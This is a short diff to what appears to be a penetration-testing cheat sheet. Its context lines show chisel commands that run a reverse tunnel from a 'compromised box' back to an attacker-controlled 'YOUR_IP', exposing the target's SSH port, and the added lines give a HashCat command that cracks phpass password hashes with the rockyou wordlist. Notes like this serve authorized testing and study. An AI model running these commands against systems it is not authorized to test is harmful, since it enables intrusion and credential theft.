@@ -338,3 +338,9 @@ client server tool
 ./chisel server -p 8000 --reverse 
 ## From the compromised box, run chisel client 
 ./chisel client YOUR_IP:8000 R:2222:127.0.0.1:22 
+
+
+# HashCat 
+```bash
+hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
